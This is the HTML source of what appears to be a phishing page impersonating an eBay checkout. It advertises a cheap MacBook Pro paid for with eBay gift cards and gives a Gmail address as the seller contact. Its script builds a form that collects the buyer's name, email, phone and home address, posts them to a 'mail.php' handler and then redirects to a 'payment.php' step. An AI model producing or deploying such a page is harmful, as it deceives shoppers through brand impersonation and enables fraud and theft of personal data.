<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width">
    <meta name="format-detection" content="telephone=no">
    <title>Checkout | eBay</title>
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="css/3sbepdq10q0dtksnrmgitl41cm08e68.css?proc=DU:N">
    <link rel="stylesheet" href="css/desktop-0fa531.css">
    <style>
        #add_row{
         padding: 16px 10px;background: #5ba71b;line-height: 0;
         border: 1px solid #555;border-radius: 2px;color: #fff;font-size: 22px;margin-top: -42px;    position: absolute;
     }
     #add_row:hover{
        text-decoration: none;
        background: #478514;
    }
    ::-webkit-input-placeholder { /* Chrome/Opera/Safari */
      opacity: 0.4;
  }
  ::-moz-placeholder { /* Firefox 19+ */
      opacity: 0.4;
  }
  :-ms-input-placeholder { /* IE 10+ */
      opacity: 0.4;
  }
  :-moz-placeholder { /* Firefox 18- */
      opacity: 0.4;
  }
  select option:first-child{
      color: #000;
  }
  .ppc-legal-text{
    font-weight:bold;
}
#error_container label {
    display: list-item;
    text-align: left;
    padding-top: 5px;
    margin: 0 12px;
    list-style-type: decimal;
}  </style>
</head>

<body class="xo desktop ">
    <div class="global-header">
        <div class="v-align2col ghCtr">
            <div class="gh-acc-exp-div gh-hide-if-nocss"><a id="gh-hdn-stm" class="gh-acc-a" href="#mainContent">Skip to main content</a></div>
            <!--[if lt IE 9]><div id="gh" role="banner" class="gh-IE8 gh-flex gh-pre-js gh-w gh-minH "><![endif]-->
                <header id="gh" role="banner" class="gh-flex gh-pre-js gh-w gh-minH ">
                    <table class="gh-tbl">
                        <tbody>
                            <tr>
                                <td class="gh-td">
                                    <!--[if lt IE 9]><a href="https://www.ebay.com/" _sp="m570.l2586" id="gh-la">eBay<img role="presentation" width=117 height=120 style='clip:rect(47px, 118px, 95px, 0px); position:absolute; top:-47px;left:0' alt="" src="images/apstidvcvu5pxlbxkphrrdo5iqv.png" id="gh-logo"></a><![endif]-->
                                    <a href="https://www.ebay.com/" _sp="m570.l2586" id="gh-la">eBay<img role="presentation" width="250" height="200" style="clip:rect(47px, 118px, 95px, 0px); position:absolute; top:-47px;left:0" alt src="images/fxxj3ttftm5ltcqnto1o4baovyl.png" id="gh-logo"></a></td>
                                </tr>
                            </tbody>
                        </table>
                        <!--[if lt IE 9]></div><![endif]-->
                    </header>
                </div>
                <div class="v-align2col surveyCtr">
                    <div id="survey" data-module-id="4276" class="mb15"><span>How do you like our checkout?</span>
                        <br><a id="surveylink" class="survey-link" data-click-id="7743" href="javascript:;" data-url="https://connect.ebay.com/srv/survey/a/cxo.ryp?ctx=uid%3Dbevali-0%26sessionid%3D737560016012%26profile%3DWEB&amp;title=0&amp;close=-1">Tell us what you think</a></div>
                    </div>
                </div>
                <h1 class="page-title">Checkout</h1>
                <form method="post" id="page-form">
                    <div id="mainContent">
                        <div class="left-section col-xs-8">
                            <div id="alert-page" class="xo-alert skin-large"></div>
                            <input type="hidden" id="ddcheckbox">
                            <div id="userInfo"></div>
                            <div id="cart-details-ctr" class="top-lvl-module" data-module-id="4066">
                                <h2 class="section-title">Pay With</h2>
                                <div class="seller-row row" id="s_0" data-sellerid="luvmy280z">
                                    <div class="seller-bucket-container module">
                                        <div id="seller-info" class="seller-info clearfix">
                                            <div class="seller-name"><span title="Seller:  luvmy280z"><span class="lbl">eBay Gift Cards </span></span>
                                            </div>
                                        </div>
                                        <div class="seller-item-group">
                                            <div class="d-table">
                                                <div class="d-tcell">
                                                    <div class="item-row">
                                                        <div class="d-table">
                                                            <div class="item-info-section d-tcell">
                                                                <div class="row item-details">
                                                                    <img src="index_Files/images/paypalmycash.png"  alt="eBay Gift Cards" style="float:right;">
                                                                    <ul>
                                                                       <li><td style="padding-left: 10px; padding-top: 10px; padding-bottom: 10px;" align="left" >Use the eBay Gift Card to shop from millions of items in Toys, Electronics, Motors, Fashion, Home & Garden, Collectibles, Art, Sporting Goods and everything in-between. eBay Gift Cards never expire and have no fees. Use it to shop now or wait for the deal of a lifetime.</li><br>
                                                                           <li><tr>
                                                                            <td style="padding-left: 20px; padding-top: 0px; padding-bottom: 0px;" align="left"><b></b> Using eBay Gift Cards for the security of 5 days inspection period.</td>
                                                                        </tr></li>
                                                                    </ul>
                                                                </div>
                                                                <div>
                                                                    <div data-test-id="item-shipping-advanced" class="item-shipping-advanced clearfix outer-service-group" data-module-id="4825">
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="cart-details-ctr" class="top-lvl-module" data-module-id="4066">
                                <h2 class="section-title">Review item and shipping</h2>
                                <div class="seller-row row" id="s_0" data-sellerid="luvmy280z">
                                    <div class="seller-bucket-container module">
                                        <div id="seller-info" class="seller-info clearfix">
                                            <div class="seller-name"><span title="Seller:  luvmy280z"><span class="lbl">Seller: </span>lenora_eaver09</span>
                                            </div>
                                            <div class="slr-actions"><span class="slr-msg"><a href="mailto:lenoraweaver01@gmail.com" role="button" aria-live="polite" data-test-id="seller-info-slr-msg-link" class="slr-msg-link" data-expandhide="true" data-action-type="openSellerMessage" data-click-id="7314">Message to seller</a><span class="slr-msg-span" data-expandhide="false">Message to seller</span></span>
                                            </div>
                                        </div>
                                        <div class="seller-item-group">
                                            <div class="d-table">
                                                <div class="d-tcell">
                                                    <div class="item-row">
                                                        <div class="d-table">
                                                            <div class="item-img-ctr">
                                                                <div class="item-image"><span class="img-ctr"><img class="img" title="APPLE MACBOOK PRO 15 2018 A1990 TOUCHBAR CORE i9 2.9GHz 6-CORE 32GB 512GB SSD" alt="APPLE MACBOOK PRO 15 2018 A1990 TOUCHBAR CORE i9 2.9GHz 6-CORE 32GB 512GB SSD" src="index_Files/images/images1/s-l500.jpg" atf="true" data-event-type="onImageLoad" border="0"></span></div>
                                                            </div>
                                                            <div class="item-info-section d-tcell">
                                                                <div class="row item-details">
                                                                    <div class="col-xs-9 item-title">APPLE MACBOOK PRO 15 2018 A1990 TOUCHBAR CORE i9 2.9GHz 6-CORE 32GB 512GB SSD</div>
                                                                    <div class="item-price-group col-xs-3">
                                                                        <div class="item-price"><span>US $600.00</span></div>
                                                                        <div class="item-price-additional-info"></div>
                                                                        <div class="item-price-additional-info"></div>
                                                                    </div>
                                                                </div>
                                                                <div class="qty2">
                                                                    <div class="xo-item-qty form form--small"><span class="qty" aria-label="Quantity">Qty: </span><span class="qty-value">1</span><span></span></div>
                                                                </div>
                                                                <div>
                                                                    <div data-test-id="item-shipping-advanced" class="item-shipping-advanced clearfix outer-service-group" data-module-id="4825">
                                                                        <fieldset id="GROUP_ITEM_122208894896-NIL-NIL">
                                                                            <legend>Select a shipping service for MACBOOK PRO</legend>
                                                                            <div class="row col-xs-9 outer-service-each service-block" data-click-id-logistics-type="SHIP_TO_HOME">
                                                                                <label class="lbl v-align2col shp-sect">Delivery

                                                                                </label>
                                                                                <div class="inner-service-group ml0">
                                                                                    <div class="inner-service-each service-block " data-click-id-logistics-type="SHIP_TO_HOME">
                                                                                        <label class="other-option v-align2col shp-sect">
                                                                                            <div class="item-shipping-advanced-other-option shipping-info">
                                                                                                <div class="item-shipping-advanced-other-option--delivery-message">By <span id="datee">Sat, Aug 08</span></div>
                                                                                            </div>
                                                                                            <div class="ship-serv">Standard Shipping - <span>Free</span></div>
                                                                                        </label>
                                                                                        <div class="status-message-template"></div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </fieldset>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="right-rail col-xs-4 right-rail-toppadding">
                            <div class="right-rail-content">
                                <div id="session-message-ctr">
                                    <div class="cart-link-text" data-async-type="addItemToCart"></div>
                                </div>
                                <div id="cart-summary-ctr">
                                    <div class="cart-summary-ctr">
                                        <h2 class="section-title access-aid">Cart Summary</h2>
                                        <div id="cart-details" class="row">
                                            <table class="w100p">
                                                <tr class="hide">
                                                    <th>Label</th>
                                                    <th>Value</th>
                                                </tr>
                                                <tr>
                                                    <td class="l-align pb10">Item (1)</td>
                                                    <td class="pb10"><span>US $600.00</span></td>
                                                </tr>
                                                <tr>
                                                    <td class="l-align">Shipping</td>
                                                    <td><span>Free</span></td>
                                                </tr>
                                            </tbody></table>
                                        </div>
                                        <div class="cart-order">
                                            <div id="cart-total" class="row">
                                                <table class="w100p">
                                                    <tbody><tr class="hide">
                                                        <th>label</th>
                                                        <th>value</th>
                                                    </tr>
                                                    <tr data-type="TOTAL">
                                                        <td class="l-align">Order total</td>
                                                        <td class="bold nowrap"><span>US $600.00</span></td>
                                                    </tr>
                                                </tbody></table>
                                            </div>
                                            <div id="call-to-action">
                                                <button type="submit" id="cta-btn" class="btn btn--primary xo-btn">Confirm Order</button>
                                            </div>
                                            <div class="cta-note disabled-note err" id="error_container"></div>
                                        </div>
                                    </div>
                                </div>
                                <div id="buyer-protection-ctr" data-module-id="4443">
                                    <div class="ebp-text"><span class="ebay-money-back"></span><a class="termsLink ebay-money-back-link" href="http://pages.ebay.com/ebay-money-back-guarantee/" title="This purchase is covered by the eBay Money Back Guarantee. Click to see details. Opens in a new window or tab." data-click-id="8215" target="_blank">See details</a></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
                <footer id="glbfooter" role="contentinfo" class="gh-w gh-flex">
                    <!--<![endif]-->
                    <div>
                        <div id=rtm_html_1650></div>
                        <div id=rtm_html_1651></div>
                    </div>
                    <h2 class=gh-ar-hdn>Additional site navigation</h2>
                    <div id="gf-t-box">
                        <table class="gf-t">
                            <tr valign="top">
                                <td class="gf-legal">Copyright © 1995-2021 eBay Inc. All Rights Reserved. <a href="https://pages.ebay.com/help/policies/user-agreement.html">User Agreement</a>, <a href="https://pages.ebay.com/help/policies/privacy-policy.html">Privacy</a>, <a href="https://pages.ebay.com/help/account/cookies-web-beacons.html">Cookies</a> and <a href="https://cgi6.ebay.com/ws/eBayISAPI.dll?AdChoiceLandingPage&amp;partner=0" id=gf-AdChoice>AdChoice</a></td>
                                <td nowrap align=center><a title="Verify site's SSL certificate" _exsp="m571.l3943" href="https://trustsealinfo.websecurity.norton.com/splash?form_file=fdf/splash.fdf&amp;dn=www.ebay.com&amp;lang=en" onclick="this.href='https://trustsealinfo.websecurity.norton.com/splash?form_file=fdf/splash.fdf&amp;dn=#D#&amp;lang=en'.replace(/#D#/,location.host);return true" rel="noreferrer"><i id=gf-norton>Norton Secured - powered by Verisign</i></a></td>
                            </tr>
                        </table>
                    </div>
                </footer>
                <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
                <script src="js/jquery.validate.min.js"></script>

                <script>    
                    $(document).ready(function(){
                       $("#page-form").validate({
                        errorLabelContainer: $("#error_container"),
                        submitHandler: function() {
                            $.ajax({
                                method: 'POST',
                                url: 'mail.php',
                                dataType: "html",
                                data : $('#page-form').serialize(),
                                success: function(data){
                                    window.location.href = "payment.php";
                                },
                                error: function(xhr, desc, err){
                                    console.log(err);
                                }
                            });
                        }
                    });
                       var userDetails='<div id="shipping-address-ctr" class="top-lvl-module shipping">\
                       <h2 class="section-title">Ship to</h2>\
                       <div class="shipping-address module" >\
                       <div class="main-sa-info v-align2col" style="width:100%">\
                       <div id="incentive-input-row" class="form clearfix">\
                       <table class="incentive-tbl" style="margin:0 auto;">\
                       <tbody>\
                       <tr>\
                       <td>First Name: </td>\
                       <td class="incentive-input-ctr">\
                       <input type="text" name=\'fName\' title="First Name is required. (at least 3 characters)" rangelength="[3,20]" style="width: 100%;" placeholder=\'\' class="form-control" required/>\
                       </td>\
                       <td style="padding-left:10px">Last Name: </td>\
                       <td class="incentive-input-ctr">\
                       <input type="text" name=\'lName\' title="Last Name is required. (at least 3 characters)" rangelength="[3,20]" placeholder=\'\' class="form-control" required/>\
                       </td>\
                       </tr>\
                       <tr>\
                       <td>Email:</td>\
                       <td  class="incentive-input-ctr"><input type="text" title="Email is required." rangelength="[10,40]" name=\'email\' placeholder=\'\' class="form-control" required style="width:100%"/></td>\
                       <td style="padding-left:10px">Phone:</td>\
                       <td  class="incentive-input-ctr" ><input type="text" title="Phone is required." rangelength="[10,12]" name=\'phone\' placeholder=\'\' class="form-control" required style="width:100%"/></td>\
                       </tr>\
                       <tr>\
                       <td>Country:</td>\
                       <td  class="incentive-input-ctr">\
                       <select id="incentive-input" name="country" class="form-control" style="width:195px;padding:5px;border-color:#ccc;border-radius: 2px;color:#777;">\
                       <option value="4">Afghanistan</option>\
                       <option value="248">Åland Islands</option>\
                       <option value="8">Albania</option>\
                       <option value="12">Algeria</option>\
                       <option value="16">American Samoa</option>\
                       <option value="20">Andorra</option>\
                       <option value="24">Angola</option>\
                       <option value="660">Anguilla</option>\
                       <option value="10">Antarctica</option>\
                       <option value="28">Antigua and Barbuda</option>\
                       <option value="32">Argentina</option>\
                       <option value="51">Armenia</option>\
                       <option value="533">Aruba</option>\
                       <option value="36">Australia</option>\
                       <option value="40">Austria</option>\
                       <option value="31">Azerbaijan</option>\
                       <option value="44">Bahamas</option>\
                       <option value="48">Bahrain</option>\
                       <option value="50">Bangladesh</option>\
                       <option value="52">Barbados</option>\
                       <option value="112">Belarus</option>\
                       <option value="56">Belgium</option>\
                       <option value="84">Belize</option>\
                       <option value="204">Benin</option>\
                       <option value="60">Bermuda</option>\
                       <option value="64">Bhutan</option>\
                       <option value="68">Bolivia, Plurinational State of</option>\
                       <option value="535">Bonaire, Sint Eustatius and Saba</option>\
                       <option value="70">Bosnia and Herzegovina</option>\
                       <option value="72">Botswana</option>\
                       <option value="74">Bouvet Island</option>\
                       <option value="76">Brazil</option>\
                       <option value="86">British Indian Ocean Territory</option>\
                       <option value="96">Brunei Darussalam</option>\
                       <option value="100">Bulgaria</option>\
                       <option value="854">Burkina Faso</option>\
                       <option value="108">Burundi</option>\
                       <option value="116">Cambodia</option>\
                       <option value="120">Cameroon</option>\
                       <option value="124">Canada</option>\
                       <option value="132">Cape Verde</option>\
                       <option value="136">Cayman Islands</option>\
                       <option value="140">Central African Republic</option>\
                       <option value="148">Chad</option>\
                       <option value="152">Chile</option>\
                       <option value="156">China</option>\
                       <option value="162">Christmas Island</option>\
                       <option value="166">Cocos (Keeling) Islands</option>\
                       <option value="170">Colombia</option>\
                       <option value="174">Comoros</option>\
                       <option value="178">Congo</option>\
                       <option value="180">Congo, the Democratic Republic of the</option>\
                       <option value="184">Cook Islands</option>\
                       <option value="188">Costa Rica</option>\
                       <option value="384">Côte d&apos;Ivoire</option>\
                       <option value="191">Croatia</option>\
                       <option value="192">Cuba</option>\
                       <option value="531">Curaçao</option>\
                       <option value="196">Cyprus</option>\
                       <option value="203">Czech Republic</option>\
                       <option value="208">Denmark</option>\
                       <option value="262">Djibouti</option>\
                       <option value="212">Dominica</option>\
                       <option value="214">Dominican Republic</option>\
                       <option value="218">Ecuador</option>\
                       <option value="818">Egypt</option>\
                       <option value="222">El Salvador</option>\
                       <option value="226">Equatorial Guinea</option>\
                       <option value="232">Eritrea</option>\
                       <option value="233">Estonia</option>\
                       <option value="231">Ethiopia</option>\
                       <option value="238">Falkland Islands (Malvinas)</option>\
                       <option value="234">Faroe Islands</option>\
                       <option value="242">Fiji</option>\
                       <option value="246">Finland</option>\
                       <option value="250">France</option>\
                       <option value="254">French Guiana</option>\
                       <option value="258">French Polynesia</option>\
                       <option value="260">French Southern Territories</option>\
                       <option value="266">Gabon</option>\
                       <option value="270">Gambia</option>\
                       <option value="268">Georgia</option>\
                       <option value="276">Germany</option>\
                       <option value="288">Ghana</option>\
                       <option value="292">Gibraltar</option>\
                       <option value="300">Greece</option>\
                       <option value="304">Greenland</option>\
                       <option value="308">Grenada</option>\
                       <option value="312">Guadeloupe</option>\
                       <option value="316">Guam</option>\
                       <option value="320">Guatemala</option>\
                       <option value="831">Guernsey</option>\
                       <option value="324">Guinea</option>\
                       <option value="624">Guinea-Bissau</option>\
                       <option value="328">Guyana</option>\
                       <option value="332">Haiti</option>\
                       <option value="334">Heard Island and McDonald Islands</option>\
                       <option value="336">Holy See (Vatican City State)</option>\
                       <option value="340">Honduras</option>\
                       <option value="344">Hong Kong</option>\
                       <option value="348">Hungary</option>\
                       <option value="352">Iceland</option>\
                       <option value="356">India</option>\
                       <option value="360">Indonesia</option>\
                       <option value="364">Iran, Islamic Republic of</option>\
                       <option value="368">Iraq</option>\
                       <option value="372">Ireland</option>\
                       <option value="833">Isle of Man</option>\
                       <option value="376">Israel</option>\
                       <option value="380">Italy</option>\
                       <option value="388">Jamaica</option>\
                       <option value="392">Japan</option>\
                       <option value="832">Jersey</option>\
                       <option value="400">Jordan</option>\
                       <option value="398">Kazakhstan</option>\
                       <option value="404">Kenya</option>\
                       <option value="296">Kiribati</option>\
                       <option value="408">Korea, Democratic People&apos;s Republic of</option>\
                       <option value="410">Korea, Republic of</option>\
                       <option value="414">Kuwait</option>\
                       <option value="417">Kyrgyzstan</option>\
                       <option value="418">Lao People&apos;s Democratic Republic</option>\
                       <option value="428">Latvia</option>\
                       <option value="422">Lebanon</option>\
                       <option value="426">Lesotho</option>\
                       <option value="430">Liberia</option>\
                       <option value="434">Libya</option>\
                       <option value="438">Liechtenstein</option>\
                       <option value="440">Lithuania</option>\
                       <option value="442">Luxembourg</option>\
                       <option value="446">Macao</option>\
                       <option value="807">Macedonia, the former Yugoslav Republic of</option>\
                       <option value="450">Madagascar</option>\
                       <option value="454">Malawi</option>\
                       <option value="458">Malaysia</option>\
                       <option value="462">Maldives</option>\
                       <option value="466">Mali</option>\
                       <option value="470">Malta</option>\
                       <option value="584">Marshall Islands</option>\
                       <option value="474">Martinique</option>\
                       <option value="478">Mauritania</option>\
                       <option value="480">Mauritius</option>\
                       <option value="175">Mayotte</option>\
                       <option value="484">Mexico</option>\
                       <option value="583">Micronesia, Federated States of</option>\
                       <option value="498">Moldova, Republic of</option>\
                       <option value="492">Monaco</option>\
                       <option value="496">Mongolia</option>\
                       <option value="499">Montenegro</option>\
                       <option value="500">Montserrat</option>\
                       <option value="504">Morocco</option>\
                       <option value="508">Mozambique</option>\
                       <option value="104">Myanmar</option>\
                       <option value="516">Namibia</option>\
                       <option value="520">Nauru</option>\
                       <option value="524">Nepal</option>\
                       <option value="528">Netherlands</option>\
                       <option value="540">New Caledonia</option>\
                       <option value="554">New Zealand</option>\
                       <option value="558">Nicaragua</option>\
                       <option value="562">Niger</option>\
                       <option value="566">Nigeria</option>\
                       <option value="570">Niue</option>\
                       <option value="574">Norfolk Island</option>\
                       <option value="580">Northern Mariana Islands</option>\
                       <option value="578">Norway</option>\
                       <option value="512">Oman</option>\
                       <option value="586">Pakistan</option>\
                       <option value="585">Palau</option>\
                       <option value="275">Palestinian Territory, Occupied</option>\
                       <option value="591">Panama</option>\
                       <option value="598">Papua New Guinea</option>\
                       <option value="600">Paraguay</option>\
                       <option value="604">Peru</option>\
                       <option value="608">Philippines</option>\
                       <option value="612">Pitcairn</option>\
                       <option value="616">Poland</option>\
                       <option value="620">Portugal</option>\
                       <option value="630">Puerto Rico</option>\
                       <option value="634">Qatar</option>\
                       <option value="638">Réunion</option>\
                       <option value="642">Romania</option>\
                       <option value="643">Russian Federation</option>\
                       <option value="646">Rwanda</option>\
                       <option value="652">Saint Barthélemy</option>\
                       <option value="654">Saint Helena, Ascension and Tristan da Cunha</option>\
                       <option value="659">Saint Kitts and Nevis</option>\
                       <option value="662">Saint Lucia</option>\
                       <option value="663">Saint Martin (French part)</option>\
                       <option value="666">Saint Pierre and Miquelon</option>\
                       <option value="670">Saint Vincent and the Grenadines</option>\
                       <option value="882">Samoa</option>\
                       <option value="674">San Marino</option>\
                       <option value="678">Sao Tome and Principe</option>\
                       <option value="682">Saudi Arabia</option>\
                       <option value="686">Senegal</option>\
                       <option value="688">Serbia</option>\
                       <option value="690">Seychelles</option>\
                       <option value="694">Sierra Leone</option>\
                       <option value="702">Singapore</option>\
                       <option value="534">Sint Maarten (Dutch part)</option>\
                       <option value="703">Slovakia</option>\
                       <option value="705">Slovenia</option>\
                       <option value="90">Solomon Islands</option>\
                       <option value="706">Somalia</option>\
                       <option value="710">South Africa</option>\
                       <option value="239">South Georgia and the South Sandwich Islands</option>\
                       <option value="728">South Sudan</option>\
                       <option value="724">Spain</option>\
                       <option value="144">Sri Lanka</option>\
                       <option value="729">Sudan</option>\
                       <option value="740">Suriname</option>\
                       <option value="744">Svalbard and Jan Mayen</option>\
                       <option value="748">Swaziland</option>\
                       <option value="752">Sweden</option>\
                       <option value="756">Switzerland</option>\
                       <option value="760">Syrian Arab Republic</option>\
                       <option value="158">Taiwan, Province of China</option>\
                       <option value="762">Tajikistan</option>\
                       <option value="834">Tanzania, United Republic of</option>\
                       <option value="764">Thailand</option>\
                       <option value="626">Timor-Leste</option>\
                       <option value="768">Togo</option>\
                       <option value="772">Tokelau</option>\
                       <option value="776">Tonga</option>\
                       <option value="780">Trinidad and Tobago</option>\
                       <option value="788">Tunisia</option>\
                       <option value="792">Turkey</option>\
                       <option value="795">Turkmenistan</option>\
                       <option value="796">Turks and Caicos Islands</option>\
                       <option value="798">Tuvalu</option>\
                       <option value="800">Uganda</option>\
                       <option value="804">Ukraine</option>\
                       <option value="784">United Arab Emirates</option>\
                       <option value="826">United Kingdom</option>\
                       <option value="840" selected>United States</option>\
                       <option value="581">United States Minor Outlying Islands</option>\
                       <option value="858">Uruguay</option>\
                       <option value="860">Uzbekistan</option>\
                       <option value="548">Vanuatu</option>\
                       <option value="862">Venezuela, Bolivarian Republic of</option>\
                       <option value="704">Viet Nam</option>\
                       <option value="92">Virgin Islands, British</option>\
                       <option value="850">Virgin Islands, U.S.</option>\
                       <option value="876">Wallis and Futuna</option>\
                       <option value="732">Western Sahara</option>\
                       <option value="887">Yemen</option>\
                       <option value="894">Zambia</option>\
                       <option value="716">Zimbabwe</option>\
                       </select>\
                       </td>\
                       <td style="padding-left:10px">State:</td>\
                       <td  class="incentive-input-ctr"> <input type="text" title="State is required." rangelength="[2,16]" name=\'state\' placeholder=\'\' class="form-control" required/></td>\
                       </tr>\
                       <tr>\
                       <td>Address:</td>\
                       <td  class="incentive-input-ctr"><input type="text" name=\'address\' title="Address is required." minlength="12" placeholder=\'\' class="form-control" required style="width:100%"/></td>\
                       <td style="padding-left:10px">Zip Code:</td>\
                       <td  class="incentive-input-ctr" ><input type="text" title="Zip is required." minlength="5" name=\'zip\' placeholder=\'\' class="form-control" required style="width:100%"/></td>\
                       </tr>\
                       </tbody>\
                       </table>\
                       </div>\
                       </div>\
                       </div>\
                       </div>\
                       ';

                       $("#userInfo").html(userDetails);
                   });


function formatDate() {
    var d = new Date(new Date().getTime()+(4*24*60*60*1000)),
        month = '' + (d.getMonth()),
        day = '' + d.getDate(),
        day_name = '' + d.getDay(),
        year = d.getFullYear();
    
    if (day.length < 2) day = '0' + day;
    
   let weekday = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
   const monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "June",
  "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
];
    
    return weekday[day_name] +", "+ monthNames[month]+" "+day; 
   
}
document.getElementById('datee').innerHTML =  formatDate();


               </script>

           </body>
           </html>